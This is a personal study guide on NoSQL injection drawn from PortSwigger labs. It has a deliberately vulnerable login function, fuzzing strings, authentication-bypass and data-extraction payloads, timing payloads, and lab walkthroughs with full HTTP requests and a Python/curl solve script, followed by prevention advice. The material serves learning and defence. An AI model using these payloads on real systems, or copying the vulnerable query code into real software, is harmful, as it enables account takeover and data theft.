# NoSQL Injection

Most of these notes were taken from online sources and/or courses. I'm not that smart to come up with all this on my own. The primary source was PortSwigger. Check out their [NoSQL Injection learning path](https://portswigger.net/web-security/learning-paths/nosql-injection) on the Web Security Academy.

## Overview

There are two different types of NoSQL injection:

- **Syntax injection** - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
- **Operator injection** - This occurs when you can use NoSQL query operators to manipulate queries.

## Understanding NoSQL Structure

### Sample Document

```json
{
  "_id": "some_unique_user_id_123",
  "username": "alex_p_dev",
  "email": "alex@example.com",
  "followers": 150,
  "isAdmin": false,
  "interests": ["pentesting", "bug bounties", "rock climbing"]
}
```

### Sample Vulnerable Code

```javascript
// WARNING: VULNERABLE CODE EXAMPLE
function login(userInput_username, userInput_password) {
  // Build a query by directly inserting user input
  let query = `{ "username": "` + userInput_username + `", "password": "` + userInput_password + `" }`;

  // Find a user in the database that matches this query
  db.users.find(query);
}
```

### Basic Injection Test

```json
{ "username": "admin", "password": {"$ne": "a"} }
```

The database reads this as: "Find a user where the `username` is 'admin' AND the `password` is **not equal to 'a'**."
## Syntax Injection

Syntax injection attempts to break the NoSQL query syntax by injecting malicious payloads.

### Detection and Fuzzing

#### Sample Fuzzing String

```
'"`{ ;$Foo} $Foo \xYZ
```

#### URL-Encoded Fuzzing

```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

#### JSON Context Fuzzing

```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

!!! tip
	To figure out which characters are processed, send individual characters to see how the application responds.

### Confirming Conditional Behavior

After identifying the vulnerability, try to determine which characters are being processed.

#### Testing False Conditions

```
' && 0 && 'x
```

#### Testing True Conditions

```
' && 1 && 'x
```

If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.

### Exploiting Syntax Injection

#### Override Existing Conditions

Attempt to override existing conditions with custom JavaScript:

```
'||'1'=='1
```

!!! warning
    Take care when injecting a condition that always evaluates to true into a NoSQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If an application uses it when updating or deleting data, for example, this can result in accidental data loss.

#### Null Character Injection

Try injecting a null character after the query:

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

??? example "PortSwigger NoSQL Injection Lab 1: Detecting NoSQL injection"

	### Lab 1: Detecting NoSQL injection
	
	```
	GET /filter?category=Pets'%22%60%7B%20%3B%24Foo%7D%20%24Foo%20%5CxYZ HTTP/1.1
	Host: 0a8c001604495d9180c60dd0006c004a.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Connection: keep-alive
	Referer: https://0a8c001604495d9180c60dd0006c004a.web-security-academy.net/
	Cookie: session=d82ldTNqdPOXGQFfW3TXmFcwNInibcG3
	Upgrade-Insecure-Requests: 1
	Sec-Fetch-Dest: document
	Sec-Fetch-Mode: navigate
	Sec-Fetch-Site: same-origin
	Sec-Fetch-User: ?1
	X-PwnFox-Color: magenta
	Priority: u=0, i
	
	
	```
	
	This causes an internal server error
	
	```
	HTTP/1.1 500 Internal Server Error
	Content-Type: text/html; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 2793
	
	<!DOCTYPE html>
	<html>
	
	<head>
	    <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
	    <link href=/resources/css/labs.css rel=stylesheet>
	    <title>Detecting NoSQL injection</title>
	</head>
	<script src="/resources/labheader/js/labHeader.js"></script>
	<div id="academyLabHeader">
	    <section class='academyLabBanner'>
	        <div class=container>
	            <div class=logo></div>
	            <div class=title-container>
	                <h2>Detecting NoSQL injection</h2>
	                <a id='lab-link' class='button' href='/'>Back to lab home</a>
	                <a class=link-back href='https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection'>
	                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
	                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
	                        <g>
	                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
	                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
	                        </g>
	                    </svg>
	                </a>
	            </div>
	            <div class='widgetcontainer-lab-status is-notsolved'>
	                <span>LAB</span>
	                <p>Not solved</p>
	                <span class=lab-status-icon></span>
	            </div>
	        </div>
	</div>
	</section>
	</div>
	<div theme="">
	    <section class="maincontainer">
	        <div class="container is-page">
	            <header class="navigation-header">
	            </header>
	            <h4>Internal Server Error</h4>
	            <p class=is-warning>Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: malformed hexadecimal character escape sequence :
	                functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
	                &apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: malformed hexadecimal character escape sequence :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}</p>
	        </div>
	    </section>
	</div>
	</body>
	
	</html>
	```
	
	Note that sending a `'` character results in an error
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085013.png)
	
	Sending a valid JS payload fixes the error
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085026.png)
	
	Check conditional behavior. Note that when we send a negative conditional, no products are shown
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085044.png)
	
	!!! warning
	    Make sure to URL encode this
	
	Now when we send a truthy value, products are returned.
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085117.png)
	
	Now sending an "or 1=1" payload we can get all products listed
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085130.png)
	
	Final payload
	
	```
	'||1||'
	```
	


## Operator Injection

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:

- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$gt` (greater than) and `$lt` (less than) are perfect. For instance, if you're trying to bypass a check on a numeric field, you could inject `{"$gt": 0}` to match any positive number.
- `$in` is great for checking against an array of possibilities.
- `$regex` is extremely powerful, as it lets you perform complex pattern matching. It can be used to slowly reveal data one character at a time.
- `$where`: This is a very dangerous one. In older versions of MongoDB, it allowed you to pass a JavaScript function to be executed on the server. Finding this is like hitting the jackpot.
- `$exists`: This checks if a field exists or not, which can be useful for figuring out the database schema.

### Response Analysis

Sending the payload is only half the battle. A professional pentester needs to carefully observe how the application responds to confirm a vulnerability. You're looking for three main types of clues:

1. **Direct Response / Content Change:** This is the easiest to spot. You inject a payload that evaluates to true, and the content of the page changes. For example, you bypass a login and see a "Welcome, admin!" message, or a search for `"a'"` returns more results than a search for `"a"`.
    
2. **Error-Based:** Sometimes, a bad query will make the database throw an error that gets displayed on the page. This is a huge clue! An error message like `unrecognized operator: $foo` tells you that the application is trying to pass your input to the database. You know you're on the right track.
    
3. **Time-Based (Blind):** This is the most advanced technique. What if the application doesn't change its content or show errors? You can inject a command that tells the database to "sleep" or perform a heavy computation _if_ a certain condition is true. If you inject a payload that says, "If the admin's password starts with 'a', sleep for 5 seconds," and the page takes 5 seconds longer to load, you've just learned the first letter of the password. This is called **blind injection**.

### Basic Operator Injection Techniques

#### GET Parameter Injection

Something like this might work in a URL:

```
username[$ne]=invalid
```

#### POST JSON Injection

We can also change GET to POST, and then inject into the body with `Content-Type: application/json`

In the JSON body, test whether the username (example) input is processing the query operator:

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

If the `$ne` operator is applied, then it will query all accounts that do NOT have the username "invalid"

#### Authentication Bypass

This could be used to bypass authentication if both the username and password fields process the operator. 

We can check a list of known usernames:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

??? example "PortSwigger NoSQL Injection Lab 2: Exploiting NoSQL operator injection to bypass authentication"

	### Lab 2: Exploiting NoSQL operator injection to bypass authentication
	
	Original request
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727084852.png)
	
	Checking if the username field processes the operator...looks like it does because even though we didn't enter the correct username, we still are able to get logged in as `wiener`
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727084914.png)
	
	Checking if the password field also processes it...looks like it also does. Note the response that the query returned an unexpected number of results. 
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727084926.png)
	
	Using the regex operator we can get logged in as the admin user, which has a random username
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727084944.png)
	
	### Sample Code Solution
	
	#### Python
	This code will solve this challenge
	
	```python
	import requests
	
	url = 'https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login'
	
	headers = {
	  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv',
	  'Content-Type': 'application/json',
	  'Cookie': 'session=Oeo2rw4ypJQwM1hYHAsO4yNGTqXwxzJq',
	  'Priority': 'u=0'
	}
	
	data = {
	  "username": {
	    "$regex": "admin*"
	  },
	  "password": {
	    "$ne": "invalid"
	  }
	}
	
	r = requests.post(url, headers=headers, json=data)
	
	print(r.status_code)
	print(r.text)
	```
	
	#### Curl
	
	```bash
	curl -X POST \
	    -H 'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv' \
	    -H 'Content-Type:application/json' \
	    -H 'Cookie:session=Oeo2rw4ypJQwM1hYHAsO4yNGTqXwxzJq' \
	    -H 'Priority:u=0' \
	    -d '{
	  "username": {
	    "$regex": "admin*"
	  },
	  "password": {
	    "$ne": "invalid"
	  }
	}' \
	    'https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login'
	```


## Data Extraction Techniques

### Identifying Field Names

It can be difficult to identify field names since NoSQL doesn't require a fixed schema (like SQL), but we can usually infer the existence of a field by the responses:

```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Comparing against a known field:

```
admin' && this.username!='
```

and an unknown field:

```
admin' && this.foo!='
```

### Extracting Data with Syntax Injection

If the query is using a `$where` clause, we can try to inject into that to retrieve sensitive data:

#### Character-by-Character Extraction

```
admin' && this.password[0] == 'a' || 'a'=='b
```

#### Using JavaScript Functions

Using the JavaScript `match()` function:

```
admin' && this.password.match(/\d/) || 'a'=='b
```

??? example "PortSwigger NoSQL Injection Lab 3: Exploiting NoSQL injection to extract data"
	### Lab 3: Exploiting NoSQL injection to extract data
	[PortSwigger NoSQL Injection Lab #3](https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-syntax-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-data)
	
	We need to extract the administrator password and log in to solve the lab
	
	Confirming that the `password` field exists
	
	```
	GET /user/lookup?user=administrator'+%26%26+this.password!%3d' HTTP/1.1
	Host: 0aa7008b033ca58c807c083c00f8009e.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Referer: https://0aa7008b033ca58c807c083c00f8009e.web-security-academy.net/my-account?id=wiener
	Connection: keep-alive
	Cookie: session=QMIuURiqO62GwvlLWRvDsROkHS4k2u5q
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=4
	
	
	```
	
	```
	HTTP/1.1 200 OK
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 96
	
	{
	    "username": "administrator",
	    "email": "admin@normal-user.net",
	    "role": "administrator"
	}
	```
	
	First thing, we need to figure out how long the password is. The following request will return the right response if the condition is true, and will return a user not found error if it's false.
	
	```
	GET /user/lookup?user=administrator'%20%26%26%20this.password.length%20%3E%201%20%7C%7C%20'a'%3D%3D'b HTTP/1.1
	Host: 0aa7008b033ca58c807c083c00f8009e.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Referer: https://0aa7008b033ca58c807c083c00f8009e.web-security-academy.net/my-account?id=wiener
	Connection: keep-alive
	Cookie: session=QMIuURiqO62GwvlLWRvDsROkHS4k2u5q
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=4
	
	```
	
	Running this through automate (intruder, whatever) we see that we get the correct response with `this.password.length > 7`, but it fails with `> 8`, so we know the password has 8 characters. 
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727102840.png)
	
	Now we can tweak the automate settings a bit
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727105215.png)
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727105229.png)
	
	Looking at the results we can see it **seems** to have worked...
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727105339.png)
	
	```
	ppycphbs
	```
	
	That worked to log in as the administrator, and we solved the lab
	
	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727105503.png)

### Advanced Operator Injection

#### Using `$where` to Confirm Injection

```json
{"username":"wiener","password":"peter", "$where":"0"}
```

```json
{"username":"wiener","password":"peter", "$where":"1"}
```

If there's a difference, it could mean the JavaScript in the `$where` clause is being evaluated.

#### Extracting Field Names with `keys()`

```json
{"$where":"Object.keys(this)[0].match('^.{0}a.*')"}
```

#### Data Exfiltration with Operators

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

!!! tip "Confirming injection with $regex"
    If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an `a`:
    
    ```json
    {"username":"admin","password":{"$regex":"^a*"}}
    ```

??? example "PortSwigger NoSQL Injection Lab 4: Exploiting NoSQL operator injection to extract unknown fields"

	We can send the original login request...note the "Invalid username or password" message.
	
	```
	POST /login HTTP/1.1
	Host: 0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Referer: https://0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net/login
	Content-Type: application/json
	Content-Length: 42
	Origin: https://0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net
	Connection: keep-alive
	Cookie: session=i4eqOjus4JQrGjGabfK4wcmKZO9nu1T6
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	{"username":"carlos","password":"invalid"}
	```
	
	```
	HTTP/1.1 200 OK
	Content-Type: text/html; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 3392
	
	[...SNIP...]
	
	                <section>
	                    <p class=is-warning>Invalid username or password</p>
	                    <form class=login-form method=POST action="/login">
	                        <label>Username</label>
	                        <input required type=username name="username" autofocus>
	                        <label>Password</label>
	                        <input required type=password name="password">
	                        <a href=/forgot-password>Forgot password?</a>
	                        <br />
	                        <button class=button onclick="event.preventDefault(); jsonSubmit('/login')"> Log in </button>
	                        <script src='/resources/js/login.js'></script>
	                    </form>
	                </section>
	```
	
	Now we can use a `$where` clause to compare results. First with a false value:
	
	```
	{"username":"carlos","password":{"$ne":"invalid"}, "$where":"0"}
	```
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727130513.png)
	
	And then with a true value:
	
	```
	{"username":"carlos","password":{"$ne":"invalid"}, "$where":"1"}
	```
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727130656.png)
	
	Note the change in the response. There's now an "Account locked: please reset your password" message instead of the invalid credentials error. 
	
	Now we can use `keys()` to identify all the fields on the user object.
	
	```
	{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[1].match('^.{}.*')"}
	```
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135006.png)
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135026.png)
	
	Running this shows the first field is "username".
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135117.png)
	
	Now switching the key index from "1" to "2", we see that the next key is "password"
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135301.png)
	
	Number three is "email"
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135933.png)
	
	Four returns errors. I eventually figured out that this only works if you generate a password reset for carlos first. After generating a password reset request for carlos and re-running this, we see that there's now a field `newPwdTkn`
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727143052.png)
	
	Now, when we submit this to the `/forgot-password` endpoint in the GET request, we get the "Invalid token error". 
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727143217.png)
	
	Now that we have the name of the field, it's possible to brute force that value the same way as the others.
	
	```
	{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.newPwdTkn.match('^.{§§}§§.*')"}
	```
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727144423.png)
	
	
	When we do that we get: `f985d7e05a11df73`. When we send that request, we're able to reset carlos' password
	
	```
	GET /forgot-password?newPwdTkn=f985d7e05a11df73 HTTP/1.1
	Host: 0a20007604e914df807e7b9d004c00da.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Connection: keep-alive
	Referer: https://0a20007604e914df807e7b9d004c00da.web-security-academy.net/login
	Cookie: session=fuemSpbHDnaLWqhjYdNdEbh4RLhwtxGa
	Upgrade-Insecure-Requests: 1
	Sec-Fetch-Dest: document
	Sec-Fetch-Mode: navigate
	Sec-Fetch-Site: same-origin
	Sec-Fetch-User: ?1
	X-PwnFox-Color: magenta
	Priority: u=0, i
	
	
	```
	
	After resetting the password we can log in as carlos and solve the lab
	
	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727144654.png)

	
## Timing-Based Attacks (Blind Injection)

Timing-based attacks are useful when the application doesn't return different content or show error messages. You can trigger a time delay under certain conditions to extract data.

### Basic Timing Payloads

#### Using `while` Loop for Delays

```javascript
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

#### Using `sleep` Function

```javascript
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

These payloads will cause a 5-second delay if the first character of the password is "a", allowing you to extract data character by character.
## Prevention

- **Strict Input Validation (Whitelisting):** This is the single most important defense. The application should never trust user input. Instead of trying to remove bad characters (**blacklisting**), it's far safer to only allow known good characters (**whitelisting**). More importantly, the code should perform **type-checking**. If the application expects a username (a string), it should reject any input that is an object (like `{"$ne": null}`). If it expects an age (a number), it should reject strings.
    
- **Use an Object-Document Mapper (ODM):** ODMs are libraries (like Mongoose for Node.js/MongoDB) that act as a middle layer between the application and the database. They allow developers to work with data as programming objects rather than raw database queries. A well-built ODM often handles sanitization and parameterization automatically, making it much harder to introduce an injection flaw.
    
- **Principle of Least Privilege:** The user account that the web application uses to connect to the database should have the minimum permissions necessary. For example, if a part of your application only needs to **read** user profiles, its database account shouldn't have permission to **delete** them. This won't prevent an injection, but it dramatically limits the damage an attacker can do if they find one.

---

## Practice Resources

Here are 4 excellent and free resources where you can safely and legally practice NoSQL injection. Most of these are easily run locally using Docker.

### 1. OWASP Juice Shop

- **What it is:** This is probably the most popular modern web application for security training. It's an intentionally insecure web shop full of vulnerabilities, including several NoSQL injection challenges. The challenges range from basic login bypasses to more advanced data exfiltration.
- **Why it's great:** It puts the vulnerabilities in the context of a real-world application. You have to find the vulnerable input fields first before you can exploit them.
- **How to get it:** It has an official Docker image that is incredibly easy to run. Just search for `owasp/juice-shop` on Docker Hub or follow the simple instructions on their official site.

### 2. PortSwigger Web Security Academy

- **What it is:** This is a free, online learning platform created by the makers of Burp Suite. It provides dozens of high-quality, interactive labs that target specific vulnerabilities.
- **Why it's great:** Their NoSQL injection labs are fantastic. They walk you through detecting the vulnerability, bypassing logins, and even exploiting syntax variations. It's all browser-based, so there's no local setup required.
- **How to get it:** Simply register for a free account on the [PortSwigger website](https://portswigger.net/web-security) to get access to all the labs.

### 3. NoSQLGoat

- **What it is:** This is a project from OWASP specifically designed to be a vulnerable-by-design application for learning NoSQL injection. It's less of a broad "find the vulnerability" game and more of a focused shooting range for NoSQLi.
- **Why it's great:** It's hyper-focused on our topic. It covers a wide variety of injection types and scenarios related to MongoDB.
- **How to get it:** It's available on GitHub and can be easily deployed using the provided Docker instructions.

### 4. Hack The Box & TryHackMe

- **What they are:** These are online platforms where you can hack into retired, realistic machines in a CTF (Capture The Flag) style. They aren't just single web apps, but often entire virtual machines with multiple services.
- **Why they're great:** They provide the most realistic practice. You'll find NoSQL injection vulnerabilities as part of a larger chain of exploitation needed to compromise a system. Many retired machines and dedicated learning "rooms" on these platforms feature NoSQLi.
- **How to get it:** Both platforms operate on a "freemium" model. You can access many retired machines and learning paths for free, with an optional subscription for more content.